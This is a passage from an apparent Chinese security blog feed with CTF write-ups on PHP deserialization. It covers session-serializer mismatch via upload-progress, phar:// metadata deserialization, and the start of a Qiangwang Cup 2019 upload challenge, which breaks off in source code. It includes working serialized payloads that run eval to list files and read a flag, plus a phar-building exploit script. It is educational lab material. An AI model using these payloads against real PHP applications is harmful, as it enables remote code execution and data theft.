class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>仔细观察会发现在index和phpinfo两个页面中使用的是两个不同的序列化引擎</p><p><img src="/2019/07/14/反序列化相关问题注意点/8.png" alt=""></p><p><img src="/2019/07/14/反序列化相关问题注意点/9.png" alt=""></p><p>这时我们自然联想到session的反序列化漏洞，但这是我们会发现我们似乎找不到突破点来控制session，经过仔细搜索 发现这里我们可以通过利用PHP_SESSION_UPLOAD_PROGRESS上传文件来控制session的内容(当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得)</p><p>这样我们可以构造如下的上传请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着我们需要知道哪里是我们可控的点，翻阅PHP手册</p><p><img src="/2019/07/14/反序列化相关问题注意点/10.png" alt=""></p><p>不难看出我们可以控制文件名来写入session文件</p><p>接下来我们来写利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz=<span class="string">'var_dump(scandir(dirname(__FILE__)));'</span>;</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:5:"OowoO":1:&#123;s:4:"mdzz";s:37:"var_dump(scandir(dirname(__FILE__)));";&#125;</span></span><br></pre></td></tr></table></figure><p>使用”\”将双引号转义一下，同时为了触发index页面的引擎我们需要在序列化字符串前加”|”</p><p><img src="/2019/07/14/反序列化相关问题注意点/11.png" alt=""></p><p>可以看到成功触发了反序列化，接着我们读取flag文件就好了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"OowoO"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"mdzz"</span>;<span class="attribute">s</span>:<span class="number">90</span>:<span class="string">"var_dump(file_get_contents(dirname(__FILE__)."</span>/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="string">"));"</span>;&#125;</span><br><span class="line">转义</span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span>:\"<span class="selector-tag">OowoO</span>\"<span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:\<span class="string">"mdzz\";s:90:\"var_dump(file_get_contents(dirname(__FILE__).\"/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/14/反序列化相关问题注意点/12.png" alt=""></p><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>该方法在某些文件系统函数参数可控的情况下，与phar://伪协议配合使用可不使用unserialize()实现反序列化操作</p><p>受影响的文件系统函数如下</p><p><img src="/2019/07/14/反序列化相关问题注意点/13.png" alt=""></p><p>(图片源于网络)</p><p>有如下示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; mini;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_get_contents($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到并没有unserialize()函数，同时存在file_get_contents函数，我们可以利用phar来触发反序列化</p><p>利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; mini=<span class="string">'yemoli'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行代码后会生成一个phar.phar文件，生成的该文件后缀名可以随意更改，接下来使用phar://伪协议进行利用</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/index.php?file=phar:<span class="comment">//phar.phar</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/14/反序列化相关问题注意点/14.png" alt=""></p><p>可以看到成功的触发了反序列化。</p><p>参考链接：</p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;private与protected问题&quot;&gt;&lt;a href=&quot;#private与protected问题&quot; class=&quot;headerlink&quot; title=&quot;private与protected问题&quot;&gt;&lt;/a&gt;private与protected问题&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
    
      <category term="系统总结" scheme="https://yml-sec.top/tags/%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2019 upload题目复现</title>
    <link href="https://yml-sec.top/2019/06/07/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-upload%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://yml-sec.top/2019/06/07/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-upload%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-06-07T06:22:04.000Z</published>
    <updated>2019-06-07T06:28:23.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>端午假期没什么事情，想着复现下强网的题目，正好前两天朋友给了个题目复现环境，想着好好总结一下</p><p><a href="https://github.com/CTFTraining/CTFTraining/blob/master/README.md" target="_blank" rel="noopener">https://github.com/CTFTraining/CTFTraining/blob/master/README.md</a></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>重要部分源码如下<br>Profile.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename_tmp;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $upload_menu;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $ext;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $img;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $except;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">        @chdir(<span class="string">"../public/upload"</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span></span><br><span class="line"><span class="php">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;ext_check();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span></span><br><span class="line"><span class="php">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;update_img();</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $user_info=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'ID'</span>])-&gt;find();</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">empty</span>($user_info[<span class="string">'img'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(db(<span class="string">'user'</span>)-&gt;where(<span class="string">'ID'</span>,$user_info[<span class="string">'ID'</span>])-&gt;data([<span class="string">"img"</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;update_cookie();</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;success(<span class="string">'Upload img successful!'</span>, url(<span class="string">'../home'</span>));</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Upload file failed!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span></span><br><span class="line"><span class="php">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>Register.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $registed;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span></span><br><span class="line"><span class="php">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span></span><br><span class="line"><span class="php">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span></span><br><span class="line"><span class="php">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125;</span></span><br><span class="line"><span class="php">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span></span><br><span class="line"><span class="php">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span></span><br><span class="line"><span class="php">        preg_match($pattern, $email, $matches);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> 